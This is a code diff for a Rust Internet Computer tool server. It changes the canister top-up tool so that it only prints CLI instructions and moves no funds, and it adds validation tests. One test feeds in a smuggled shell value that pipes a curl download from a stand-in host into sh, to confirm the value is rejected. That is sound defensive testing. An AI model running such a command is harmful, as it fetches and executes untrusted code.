@@ -11,16 +11,21 @@
 //!     `aaaaa-aa`), as the boundary node requires, and is signed by a
 //!     controller (the management identity).
 //!
-//!   * Funding, two ways (both as the management identity):
+//!   * Funding at **creation**, two ways (both as the management identity):
 //!       - **`cycles`** — draw from the caller's existing **cycles-ledger**
 //!         (`um5iw-rqaaa-aaaaq-qaaba-cai`) balance (a user ingress message can't
 //!         attach cycles, so the ledger, being a canister, attaches them).
 //!       - **`icp`** — transfer ICP from the caller's **ICP-ledger** account to
-//!         the **CMC** (memo-tagged deposit) and `notify_create_canister` /
-//!         `notify_top_up` to mint cycles. Best-effort, single attempt: if the
-//!         transfer lands but the notify fails, the ICP is held by the CMC and is
-//!         recoverable by re-notifying with the returned block index (we do NOT
-//!         retry, and the caller must NOT blindly re-run — that transfers again).
+//!         the **CMC** (memo-tagged deposit) and `notify_create_canister` to mint
+//!         cycles. Best-effort, single attempt: if the transfer lands but the
+//!         notify fails, the ICP is held by the CMC and is recoverable by
+//!         re-notifying with the returned block index (we do NOT retry, and the
+//!         caller must NOT blindly re-run — that transfers again).
+//!
+//! **Top-ups are instructions-only.** `icp_top_up_canister` deliberately executes
+//! nothing: it returns the CLI steps for the user to run the top-up themselves
+//! (see [`top_up_instructions`]). The tool exists to reflect the platform
+//! capability; this server does not move cycles or ICP for a top-up.
 //!
 //! Compiling Motoko/Rust to Wasm happens in the agent's own environment (guided
 //! by the IC skills); these tools take the already-built Wasm and put it on
@@ -39,16 +44,15 @@ use crate::identities::Identities;
 /// Cycles ledger — creates/funds canisters from a principal's cycles balance.
 const CYCLES_LEDGER: &str = "um5iw-rqaaa-aaaaq-qaaba-cai";
 /// Cycles Minting Canister — mints cycles from ICP for the `icp` funding path
-/// (`notify_create_canister` / `notify_top_up`).
+/// (`notify_create_canister`).
 const CMC: &str = "rkp4c-7iaaa-aaaaa-aaaca-cai";
 /// ICP ledger — the `icp` funding path transfers ICP from the caller's account here.
 const ICP_LEDGER: &str = "ryjl3-tyaaa-aaaaa-aaaba-cai";
 /// Standard ICP-ledger transfer fee (0.0001 ICP), charged on top of the amount.
 const ICP_TRANSFER_FEE_E8S: u64 = 10_000;
-/// CMC deposit memos (ASCII, little-endian u64) that tag an ICP transfer with the
+/// CMC deposit memo (ASCII, little-endian u64) that tags an ICP transfer with the
 /// operation it funds. Defined by the ICP ledger / cycles-minting canister.
 const MEMO_CREATE_CANISTER: u64 = 0x4145_5243; // 'CREA'
-const MEMO_TOP_UP_CANISTER: u64 = 0x5055_5054; // 'TPUP'
 /// 1 ICP = 100_000_000 e8s.
 const E8S_PER_ICP: u64 = 100_000_000;
 /// Above this, install via the chunk store rather than a single ingress message
@@ -87,16 +91,17 @@ pub struct CreateCanisterArgs {
 
 #[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
 pub struct TopUpArgs {
-    /// Canister to top up.
+    /// Canister to top up. Echoed into the returned CLI instructions; nothing is
+    /// executed against it.
     pub canister_id: String,
-    /// Cycles to add (exact), drawn from your **cycles-ledger** balance (the
-    /// principal `icp_cycles_balance` reports). Omit to use `icp` instead.
+    /// Intended cycle amount. OPTIONAL and informational only: it is substituted
+    /// into the printed CLI commands so the user can copy-paste them; no cycles
+    /// are moved by this tool.
     #[serde(default)]
     pub cycles: Option<u64>,
-    /// ICP to convert into cycles for the top-up, as a decimal string. Transferred
-    /// from your **ICP-ledger** account (same management principal as
-    /// `icp_cycles_balance`, default subaccount) and minted via the CMC — best-effort,
-    /// single attempt, no retries. Ignored when `cycles` is set.
+    /// Intended ICP amount to convert into cycles, as a decimal string. OPTIONAL
+    /// and informational only: substituted into the printed CLI commands; no ICP
+    /// is moved by this tool.
     #[serde(default)]
     pub icp: Option<String>,
 }
@@ -163,7 +168,7 @@ pub struct NoArgs {}
 
 /// Structured result of the lifecycle/action tools that confirm an operation on
 /// a specific canister (`icp_canister_status`, `icp_install_code`,
-/// `icp_update_canister_settings`, `icp_top_up_canister`, `icp_start_canister`,
+/// `icp_update_canister_settings`, `icp_start_canister`,
 /// `icp_stop_canister`, `icp_uninstall_code`, `icp_delete_canister`).
 #[derive(Debug, Serialize, schemars::JsonSchema)]
 pub struct CanisterActionOutput {
@@ -171,6 +176,26 @@ pub struct CanisterActionOutput {
     pub canister_id: String,
     /// Human-readable summary of the outcome (same as the text content).
     pub message: String,
+}
+
+/// Structured result of `icp_top_up_canister` — CLI instructions, never an
+/// executed operation. The tool reflects a platform capability for
+/// completeness, but the server does not move cycles or ICP on the user's
+/// behalf; the user runs the printed commands themselves.
+#[derive(Debug, Serialize, schemars::JsonSchema)]
+pub struct TopUpInstructions {
+    /// The canister the instructions are for (canonical principal text).
+    pub canister_id: String,
+    /// Always `false`: this tool executes nothing and moves no funds.
+    pub executed: bool,
+    /// Step-by-step CLI instructions for the user to run the top-up themselves.
+    pub instructions: String,
+}
+
+impl TopUpInstructions {
+    pub fn human(&self) -> String {
+        self.instructions.clone()
+    }
 }
 
 /// Structured result of `icp_cycles_balance`.
@@ -228,7 +253,7 @@ fn default_init_arg() -> String {
 // testable without an IcTools and main.rs stays thin.
 // ===========================================================================
 
-/// Your cycles-ledger balance (the funds `icp_create_canister`/`icp_top_up_canister` spend).
+/// Your cycles-ledger balance (the funds `icp_create_canister` spends).
 pub async fn cycles_balance(ids: &Identities, session_id: &str) -> Result<CyclesBalance, String> {
     let (agent, principal) = management_agent(ids, session_id).await?;
     let ledger = parse_principal(CYCLES_LEDGER)?;
@@ -344,61 +369,54 @@ pub async fn create_canister(
     }
 }
 
-/// Add cycles to an existing canister — from your cycles-ledger balance (`cycles`)
-/// or by converting ICP via the CMC (`icp`). `cycles` takes precedence.
-pub async fn top_up_canister(
-    ids: &Identities,
-    session_id: &str,
-    args: TopUpArgs,
-) -> Result<String, String> {
-    ids.require_write(session_id).await?;
+/// Build the CLI instructions `icp_top_up_canister` returns. Deliberately
+/// executes nothing: no identity, no session, no canister call. The tool
+/// reflects the platform capability (canisters are topped up with cycles) for
+/// completeness, but the operation itself is the user's to run, in their own
+/// terminal, with a CLI and keys they control.
+pub fn top_up_instructions(args: TopUpArgs) -> Result<TopUpInstructions, String> {
+    // Validate + canonicalize the id so the printed commands are copy-pastable.
     let target = parse_principal(&args.canister_id)?;
-    let (agent, _) = management_agent(ids, session_id).await?;
-
-    // ICP funding path: transfer ICP to the CMC (memo = TOP_UP, deposit
-    // sub-account derived from the TARGET canister), then notify_top_up to mint
-    // cycles straight into it. Best-effort, single attempt.
-    if args.cycles.is_none() {
-        if let Some(icp) = args.icp.as_deref() {
-            let e8s = parse_icp_e8s_positive(icp)?;
-            let block = cmc_icp_deposit(&agent, &target, MEMO_TOP_UP_CANISTER, e8s).await?;
-            let arg = NotifyTopUpArg {
-                block_index: block,
-                canister_id: target,
-            };
-            let bytes = Encode!(&arg).map_err(|e| format!("encode notify_top_up: {e}"))?;
-            let reply = update_call(&agent, parse_principal(CMC)?, "notify_top_up", bytes)
-                .await
-                .map_err(|e| notify_failed_hint("notify_top_up", block, &e))?;
-            let result = Decode!(&reply, NotifyTopUpResult)
-                .map_err(|e| format!("decode notify_top_up reply: {e}"))?;
-            return match result {
-                Ok(cycles) => Ok(format!(
-                    "Topped up {target} with {cycles} cycles (converted from {icp} ICP; ICP-ledger block {block})."
-                )),
-                Err(e) => Err(notify_error_msg("notify_top_up", block, e)),
-            };
-        }
-    }
-
-    // Cycles funding path: draw from your cycles-ledger balance.
-    let cycles = require_cycles(args.cycles)?;
-    let ledger = parse_principal(CYCLES_LEDGER)?;
-    let withdraw = WithdrawArg {
-        amount: Nat::from(cycles),
-        from_subaccount: None,
-        to: target,
-        created_at_time: None,
+    // Substitute intended amounts into the commands where given; otherwise leave
+    // shell-style placeholders for the user to fill in. Given amounts go through
+    // the same validators the executing path used: the values are echoed into
+    // commands advertised as copy-pastable, so junk — a zero, a non-numeric
+    // string, anything smuggling shell input — is rejected, never printed. (A
+    // validated `icp` is digits with at most one dot, so it is inert in a shell.)
+    let cycles = match args.cycles {
+        Some(0) => return Err("cycles amount must be greater than 0".into()),
+        Some(c) => c.to_string(),
+        None => "<CYCLES>".to_string(),
     };
-    let arg = Encode!(&withdraw).map_err(|e| format!("encode withdraw: {e}"))?;
-    let reply = update_call(&agent, ledger, "withdraw", arg).await?;
-    let result = Decode!(&reply, WithdrawResult).map_err(|e| format!("decode withdraw reply: {e}"))?;
-    match result {
-        Ok(block) => Ok(format!(
-            "Topped up {target} with {cycles} cycles (cycles-ledger block {block})."
-        )),
-        Err(e) => Err(format!("cycles ledger refused withdraw: {e:?}")),
-    }
+    let icp = match args.icp.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
+        Some(s) => {
+            parse_icp_e8s_positive(s)?;
+            s.to_string()
+        }
+        None => "<ICP_AMOUNT>".to_string(),
+    };
+    let instructions = format!(
+        "No top-up was performed and no funds were moved: this server does not \
+         execute top-ups on your behalf. This \
+         tool exists for completeness — topping up canisters is an Internet \
+         Computer platform capability — but the operation itself is yours to run, \
+         from your own terminal, with the icp CLI:\n\
+         \n\
+         \x20 1. Get the icp CLI (if needed):       npm install -g @icp-sdk/icp-cli\n\
+         \x20    (Node.js >= 22; other installers: https://github.com/dfinity/icp-cli/releases)\n\
+         \x20 2. Check your cycles-ledger balance:  icp cycles balance -n ic\n\
+         \x20 3. (If needed) convert ICP to cycles: icp cycles mint --icp {icp} -n ic\n\
+         \x20 4. Deposit cycles onto the canister:  icp canister top-up {target} --amount {cycles} -e ic\n\
+         \x20    (--amount accepts k/m/b/t suffixes, e.g. --amount 600b)\n\
+         \n\
+         For the full funding guide, load the official cycles-management skill \
+         (icp_get_skill with name \"cycles-management\")."
+    );
+    Ok(TopUpInstructions {
+        canister_id: target.to_text(),
+        executed: false,
+        instructions,
+    })
 }
 
 /// Install (or reinstall/upgrade) a Wasm module on a canister you control.
@@ -680,8 +698,8 @@ fn account_identifier(owner: &Principal, subaccount: &[u8; 32]) -> Vec<u8> {
 }
 
 /// Transfer ICP from your ICP-ledger account to the CMC's memo-tagged deposit
-/// account for `dest` (the payer for CREATE, the target canister for TOP_UP), and
-/// return the ICP-ledger block index. A failure here means no funds were moved.
+/// account for `dest` (the payer/caller, for CREATE), and return the ICP-ledger
+/// block index. A failure here means no funds were moved.
 async fn cmc_icp_deposit(
     agent: &Agent,
     dest: &Principal,
@@ -969,39 +987,6 @@ enum CreateCanisterError {
 }
 type CreateResult = std::result::Result<CreateCanisterSuccess, CreateCanisterError>;
 
-#[derive(CandidType)]
-struct WithdrawArg {
-    amount: Nat,
-    from_subaccount: Option<Vec<u8>>,
-    to: Principal,
-    created_at_time: Option<u64>,
-}
-
-#[derive(CandidType, Deserialize, Debug)]
-enum RejectionCode {
-    NoError,
-    SysFatal,
-    SysTransient,
-    DestinationInvalid,
-    CanisterReject,
-    CanisterError,
-    Unknown,
-}
-
-#[derive(CandidType, Deserialize, Debug)]
-enum WithdrawError {
-    GenericError { message: String, error_code: Nat },
-    TemporarilyUnavailable,
-    FailedToWithdraw { fee_block: Option<Nat>, rejection_code: RejectionCode, rejection_reason: String },
-    Duplicate { duplicate_of: Nat },
-    BadFee { expected_fee: Nat },
-    InvalidReceiver { receiver: Principal },
-    CreatedInFuture { ledger_time: u64 },
-    TooOld,
-    InsufficientFunds { balance: Nat },
-}
-type WithdrawResult = std::result::Result<Nat, WithdrawError>;
-
 // ---- Shared settings (subset valid for both the cycles ledger and the
 //      management canister `canister_settings`; only set fields are encoded) ----
 
@@ -1059,13 +1044,7 @@ enum TransferError {
 }
 type TransferResult = std::result::Result<u64, TransferError>;
 
-// ---- CMC (ICP → cycles: notify_create_canister / notify_top_up) ----
-
-#[derive(CandidType)]
-struct NotifyTopUpArg {
-    block_index: u64,
-    canister_id: Principal,
-}
+// ---- CMC (ICP → cycles: notify_create_canister) ----
 
 #[derive(CandidType)]
 struct NotifyCreateCanisterArg {
@@ -1090,8 +1069,6 @@ enum NotifyError {
         error_message: String,
     },
 }
-/// `notify_top_up` → `variant { Ok: nat (cycles); Err: NotifyError }`.
-type NotifyTopUpResult = std::result::Result<Nat, NotifyError>;
 /// `notify_create_canister` → `variant { Ok: principal; Err: NotifyError }`.
 type NotifyCreateResult = std::result::Result<Principal, NotifyError>;
 
@@ -1228,6 +1205,101 @@ mod tests {
         assert_eq!(parse_icp_e8s_positive("0.5").unwrap(), 50_000_000);
     }
 
+    // icp_top_up_canister is instructions-only: the structured output must say
+    // nothing was executed, and the printed commands must be copy-pastable —
+    // canonical canister id, given amounts substituted, the rest left as
+    // placeholders.
+    #[test]
+    fn top_up_instructions_execute_nothing_and_echo_cycles() {
+        let out = top_up_instructions(TopUpArgs {
+            canister_id: "  ryjl3-tyaaa-aaaaa-aaaba-cai ".into(),
+            cycles: Some(600_000_000_000),
+            icp: None,
+        })
+        .unwrap();
+        assert!(!out.executed, "the tool must never execute a top-up");
+        assert_eq!(out.canister_id, "ryjl3-tyaaa-aaaaa-aaaba-cai", "id must be canonicalized");
+        assert!(out.instructions.contains("No top-up was performed"), "{}", out.instructions);
+        assert!(
+            out.instructions.contains(
+                "icp canister top-up ryjl3-tyaaa-aaaaa-aaaba-cai --amount 600000000000 -e ic"
+            ),
+            "{}",
+            out.instructions
+        );
+        // Where to get the CLI is part of the instructions: an npm one-liner
+        // inline, plus the releases page for the other installers.
+        assert!(
+            out.instructions.contains("npm install -g @icp-sdk/icp-cli"),
+            "{}",
+            out.instructions
+        );
+        assert!(
+            out.instructions.contains("https://github.com/dfinity/icp-cli/releases"),
+            "{}",
+            out.instructions
+        );
+        // No ICP amount given: the conversion lines keep a fill-in placeholder.
+        assert!(out.instructions.contains("--icp <ICP_AMOUNT>"), "{}", out.instructions);
+        assert!(out.instructions.contains("cycles-management"), "{}", out.instructions);
+    }
+
+    #[test]
+    fn top_up_instructions_echo_icp_and_leave_cycles_placeholder() {
+        let out = top_up_instructions(TopUpArgs {
+            canister_id: "aaaaa-aa".into(),
+            cycles: None,
+            icp: Some(" 0.5 ".into()),
+        })
+        .unwrap();
+        assert!(!out.executed);
+        assert!(out.instructions.contains("icp cycles mint --icp 0.5 -n ic"), "{}", out.instructions);
+        assert!(
+            out.instructions.contains("icp canister top-up aaaaa-aa --amount <CYCLES> -e ic"),
+            "{}",
+            out.instructions
+        );
+    }
+
+    // The echoed amounts are advertised as copy-pastable, so junk is rejected
+    // (never printed): a non-numeric `icp` — including a string smuggling shell
+    // input — and a zero `cycles` are errors, exactly as on the old executing
+    // path.
+    #[test]
+    fn top_up_instructions_validate_amounts() {
+        let shell = top_up_instructions(TopUpArgs {
+            canister_id: "aaaaa-aa".into(),
+            cycles: None,
+            icp: Some("1; curl evil-example | sh".into()),
+        })
+        .expect_err("shell-looking icp must be rejected");
+        assert!(shell.contains("invalid ICP amount"), "{shell}");
+        assert!(top_up_instructions(TopUpArgs {
+            canister_id: "aaaaa-aa".into(),
+            cycles: None,
+            icp: Some("abc".into()),
+        })
+        .is_err());
+        let zero = top_up_instructions(TopUpArgs {
+            canister_id: "aaaaa-aa".into(),
+            cycles: Some(0),
+            icp: None,
+        })
+        .expect_err("zero cycles must be rejected");
+        assert!(zero.contains("greater than 0"), "{zero}");
+    }
+
+    #[test]
+    fn top_up_instructions_reject_bad_canister_id() {
+        let err = top_up_instructions(TopUpArgs {
+            canister_id: "not-a-principal!".into(),
+            cycles: None,
+            icp: None,
+        })
+        .expect_err("an invalid canister id must be rejected");
+        assert!(err.contains("invalid principal"), "{err}");
+    }
+
     // CMC deposit sub-account: [len][principal bytes][zero-pad] to 32 bytes.
     #[test]
     fn principal_subaccount_layout() {
@@ -1255,12 +1327,12 @@ mod tests {
         assert_eq!(id, id2);
     }
 
-    // The ICP-ledger transfer args and both CMC notify args must encode — a bad
+    // The ICP-ledger transfer args and the CMC notify args must encode — a bad
     // field name/order would only surface on mainnet otherwise.
     #[test]
     fn icp_and_cmc_args_encode() {
         let transfer = TransferArgs {
-            memo: MEMO_TOP_UP_CANISTER,
+            memo: MEMO_CREATE_CANISTER,
             amount: Tokens { e8s: 100_000_000 },
             fee: Tokens { e8s: ICP_TRANSFER_FEE_E8S },
             from_subaccount: None,
@@ -1271,11 +1343,6 @@ mod tests {
             created_at_time: None,
         };
         assert!(Encode!(&transfer).is_ok());
-        assert!(Encode!(&NotifyTopUpArg {
-            block_index: 7,
-            canister_id: Principal::management_canister(),
-        })
-        .is_ok());
         assert!(Encode!(&NotifyCreateCanisterArg {
             block_index: 7,
             controller: Principal::management_canister(),
@@ -1294,9 +1361,9 @@ mod tests {
     // Round-trip the reply enums so a variant rename/reshape fails at test time.
     #[test]
     fn notify_and_transfer_errors_round_trip() {
-        let bytes = Encode!(&NotifyTopUpResult::Err(NotifyError::Processing)).unwrap();
+        let bytes = Encode!(&NotifyCreateResult::Err(NotifyError::Processing)).unwrap();
         assert!(matches!(
-            Decode!(&bytes, NotifyTopUpResult).unwrap(),
+            Decode!(&bytes, NotifyCreateResult).unwrap(),
             Err(NotifyError::Processing)
         ));
         let refunded = NotifyError::Refunded {
